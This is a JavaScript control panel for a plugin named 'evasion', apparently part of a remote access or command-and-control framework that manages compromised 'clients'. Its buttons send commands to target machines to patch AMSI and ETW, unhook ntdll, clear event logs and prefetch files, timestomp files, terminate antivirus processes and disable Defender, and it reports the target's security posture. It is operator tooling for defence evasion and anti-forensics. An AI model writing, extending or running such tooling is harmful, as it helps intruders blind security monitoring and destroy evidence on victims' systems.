const PLUGIN_ID = "evasion";

let currentClientId = "";

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 200) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function collectSettings() {
  const logs = $("eventLogs").value.split(",").map((s) => s.trim()).filter(Boolean);
  return {
    patchAmsi: true,
    patchEtw: true,
    unhookNtdll: true,
    wipeLogs: true,
    wipePrefetch: $("wipePrefetch").checked,
    wipeRecent: $("wipeRecent").checked,
    clearEventLogs: logs,
    timestompPath: $("timestompPath").value.trim(),
    timestompFrom: $("timestompFrom").value.trim(),
  };
}

function renderPosture(p) {
  const el = $("posture");
  if (!p) {
    el.className = "info empty";
    el.textContent = "not probed — run recon";
    return;
  }
  el.className = "info";
  el.innerHTML = "";

  const add = (k, v, cls) => {
    const d = document.createElement("div");
    d.innerHTML = `<span class="k">${k}:</span> <span class="${cls || "v"}"></span>`;
    d.querySelector("span:last-child").textContent = v;
    el.appendChild(d);
  };

  add("elevated", p.admin ? "yes" : "no — most actions will fail", p.admin ? "ok" : "bad");
  add("amsi loaded", p.amsiLoaded ? "yes (patchable)" : "no", p.amsiLoaded ? "warn" : "ok");
  add("ntdll base", p.ntdllBase || "-");

  const av = p.av || [];
  add("detected av", av.length ? av.join(", ") : "none found", av.length ? "bad" : "ok");

  if (p.defender) {
    add("defender", String(p.defender).slice(0, 200));
  }
}

function renderActions(list) {
  $("actCount").textContent = list.length;
  const body = $("actBody");
  body.innerHTML = "";
  if (!list.length) {
    $("actEmpty").style.display = "block";
    return;
  }
  $("actEmpty").style.display = "none";
  list.forEach((a) => {
    const tr = document.createElement("tr");

    const k = document.createElement("td");
    k.className = "kind";
    k.textContent = a.kind;

    const r = document.createElement("td");
    const s = document.createElement("span");
    s.className = "res " + (a.ok ? "ok" : "fail");
    s.textContent = a.ok ? "ok" : "failed";
    r.appendChild(s);

    const d = document.createElement("td");
    d.className = "detail";
    d.textContent = a.detail || "";

    tr.appendChild(k);
    tr.appendChild(r);
    tr.appendChild(d);
    body.appendChild(tr);
  });
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      if (p.detail) log(p.detail, p.state === "done" ? "ok" : "");
      break;
    case "recon":
      renderPosture(p);
      log(`av: ${(p.av || []).join(", ") || "none"} | elevated: ${p.admin ? "yes" : "no"}`, "ok");
      break;
    case "amsi":
      loadActions();
      log(p.patched ? `AMS I patched at ${p.addr}` : `AMSI not patched: ${p.reason}`, p.patched ? "ok" : "warn");
      break;
    case "etw":
      loadActions();
      log(p.patched ? `ETW patched at ${p.addr}` : `ETW not patched: ${p.reason}`, p.patched ? "ok" : "warn");
      break;
    case "unhook":
      loadActions();
      log(p.ok ? `ntdll .text restored (${p.bytes} bytes)` : `unhook failed`, p.ok ? "ok" : "err");
      break;
    case "wipe":
      loadActions();
      log(`logs cleared: ${(p.eventLogs || []).join(", ") || "none"} | prefetch: ${p.prefetchDeleted || 0} | recent: ${p.recentDeleted || 0}`, "ok");
      break;
    case "timestomp":
      loadActions();
      log(`timestamps copied from ${p.source}`, "ok");
      break;
    case "killav":
      loadActions();
      log(`killed: ${(p.killed || []).join(", ") || "none"} of ${p.attempted}`, (p.killed || []).length ? "ok" : "warn");
      break;
    case "defender":
      loadActions();
      log(`defender: ${p.result || ""}`, "warn");
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "recon", "amsi", "etw", "unhook", "wipe", "timestomp",
   "killav", "defender", "error", "pong"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function loadPosture() {
  if (!currentClientId) return;
  try { renderPosture(await rpc("get_recon", { clientId: currentClientId })); } catch (e) {}
}

async function loadActions() {
  if (!currentClientId) return;
  try { renderActions(await rpc("list_actions", { clientId: currentClientId })); } catch (e) {}
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadPosture(); loadActions();
    }
  } catch (e) {}
}

async function save() {
  try { await rpc("save_config", { clientId: currentClientId, config: collectSettings() }); } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadPosture(); loadActions();
  });

  $("refreshClients").addEventListener("click", refreshClients);
  $("recon").addEventListener("click", () => { setBadge("working"); sendEvent("recon"); });

  $("patchAmsi").addEventListener("click", () => sendEvent("patch_amsi"));
  $("patchEtw").addEventListener("click", () => sendEvent("patch_etw"));
  $("unhook").addEventListener("click", () => sendEvent("unhook"));

  $("harden").addEventListener("click", async () => {
    await save();
    setBadge("working");
    sendEvent("harden", collectSettings());
  });

  $("wipeLogs").addEventListener("click", async () => {
    await save();
    if (!confirm("Clear event logs on the target? This is visible in some monitoring setups.")) return;
    sendEvent("wipe_logs", collectSettings());
  });

  $("timestomp").addEventListener("click", async () => {
    await save();
    sendEvent("timestomp", collectSettings());
  });

  $("killAv").addEventListener("click", () => {
    if (!confirm("Terminate security processes? This is the loudest possible action and is very likely to be alerted on.")) return;
    sendEvent("kill_av");
  });

  $("disableDefender").addEventListener("click", () => {
    if (!confirm("Modify Defender preferences? Tamper Protection blocks this on modern builds.")) return;
    sendEvent("disable_defender");
  });
}

bind();
connectStream();
loadPosture(); loadActions();
refreshClients();
